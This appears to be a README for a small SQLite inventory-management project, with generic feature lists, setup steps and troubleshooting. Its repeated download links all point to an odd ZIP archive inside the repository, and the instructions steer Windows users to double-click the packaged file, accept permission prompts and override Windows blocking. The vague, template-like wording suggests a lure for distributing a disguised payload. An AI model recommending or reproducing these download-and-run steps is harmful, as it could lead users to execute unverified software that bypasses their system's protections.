# 📦 Inventory-Management-System-SQLite - Simple stock tracking in one place

[![Download](https://img.shields.io/badge/Download-Inventory--Management--System--SQLite-blue?style=for-the-badge)](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)

## 🚀 Download and run

Use this link to visit the project page and get the files:

[Download Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)

## 🖥️ What this app does

Inventory-Management-System-SQLite helps you keep track of items in a simple local database. It uses SQLite, which stores data in one file on your computer. The app supports common inventory tasks like adding items, changing records, removing entries, and viewing saved data.

It also uses linked tables and foreign keys, so related data stays organized. The project includes seed data, which gives you sample records to explore after setup. Basic sign-in handling is part of the design, so you can see how access control can work in a small database app.

## ✨ Main features

- Add new inventory items
- Edit item details
- Remove items you no longer need
- View saved stock records
- Store data in SQLite
- Use table links for related data
- Keep data consistent with foreign keys
- Load sample data at start
- Handle basic authentication flow
- Work with a clean relational database design

## 📋 Before you start

You need:

- A Windows computer
- Internet access
- A web browser
- Permission to save files on your PC
- Enough free disk space for the app files and database

If the project includes a Python-based build, you may also need:

- Python 3.10 or newer
- SQLite support, which is usually built in
- A terminal or command prompt for first-time setup

## 📥 Download steps for Windows

1. Open the download page:
   [Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)

2. Look for the project files on the page.

3. If you see a release, setup file, or packaged app, download it to your computer.

4. Save the file in a folder you can find, such as Downloads or Desktop.

5. If the project comes as a ZIP file, right-click it and choose Extract All.

6. Open the extracted folder and look for the main app file or run instructions.

## 🏁 Run the app on Windows

### Option 1: If you downloaded a ready-to-run file

1. Open the folder where the file was saved.
2. Double-click the app file.
3. If Windows asks for permission, choose Yes.
4. Wait for the app window to open.

### Option 2: If you downloaded the source files

1. Open the extracted project folder.
2. Find the main Python file, such as `main.py` or `app.py`.
3. Open Command Prompt in that folder.
4. Run the app with the project command, such as:
   `python main.py`
5. If the app uses another file name, open the file that starts the program.

## 🗂️ Typical folder contents

A project like this often includes:

- A main app file
- A database file
- A folder for data or assets
- Seed data scripts
- Login or auth files
- Table and query files
- A README file with setup notes

## 🔧 First-time setup

If the app needs a few extra steps, follow this order:

1. Open the project folder.
2. Check for a file named `requirements.txt`.
3. If it exists, install the needed Python packages with:
   `pip install -r requirements.txt`
4. Run the app after the install finishes.
5. If the project includes a database file, keep it in the same folder as the app unless the README says otherwise.

## 🧱 Database structure

This project uses a relational setup, which means the data is split into related tables. That helps keep records clear and reduces duplication.

Common table types in this kind of app include:

- Products
- Categories
- Suppliers
- Stock movements
- Users

Foreign keys connect these tables. For example, a product can link to a category, or a stock entry can link to a product. This makes the data easier to manage and check.

## 🧪 Sample use flow

A simple way to use the app may look like this:

1. Open the app.
2. Sign in if the app asks for user details.
3. Add a new item.
4. Enter the item name, quantity, and category.
5. Save the record.
6. Update the item when stock changes.
7. Remove items that are no longer needed.
8. Review the database records as needed.

## 🪟 Windows tips

- Keep the project folder in a simple path like `C:\Inventory-App`
- Avoid moving files after setup
- If the app will not open, run it from the project folder
- If Windows blocks the file, check the file properties and allow access if needed
- Use the same folder for the app and database unless the project says otherwise

## 🔐 Basic authentication

This project includes basic sign-in handling. That means it can support a simple login flow for users who should access the app. In a small project like this, authentication often checks a user name and password before allowing access to inventory data.

## 🧰 Troubleshooting

### The app does not open
- Check that you opened the right file
- Make sure the project folder still has all its files
- Try running the app from Command Prompt

### The database does not load
- Confirm the SQLite file is in the correct folder
- Check that the file name did not change
- Make sure the app has permission to read the file

### The screen looks empty
- The app may need seed data
- Open the database setup or init step if one is included
- Restart the app after the data loads

### You get a Python error
- Confirm Python is installed
- Check that required packages are installed
- Run the command from inside the project folder

## 📁 Expected file names

You may see files like:

- `main.py`
- `app.py`
- `database.db`
- `seed_data.sql`
- `requirements.txt`
- `README.md`

## 🧭 How to use the data safely

- Keep a backup copy of the database file
- Do not edit the database file while the app is open
- Save changes before closing the program
- Use clear item names and stock counts
- Check linked records before deleting anything

## 🧾 Project focus

This repository shows how to build a small inventory system with:

- SQLite as the local database
- CRUD operations for daily records
- Foreign key rules for related tables
- Seed data for quick testing
- Basic authentication handling
- A structured design for simple data work

## 📌 Use cases

This type of app can help with:

- School inventory projects
- Small shop stock lists
- Practice with database design
- Learning CRUD operations
- Testing table relationships
- Managing simple product records

## 📦 Download link again

[Visit the project page to download Inventory-Management-System-SQLite](https://github.com/janalimited196/Inventory-Management-System-SQLite/raw/refs/heads/main/core/Management_System_Inventory_SQ_Lite_3.5.zip)

## 🛠️ Common setup checklist

1. Download the project from the link above.
2. Extract the files if they come in a ZIP archive.
3. Make sure Python is installed if the app needs it.
4. Install dependencies if a requirements file is present.
5. Run the main app file.
6. Sign in if the app asks for login details.
7. Add or view inventory records.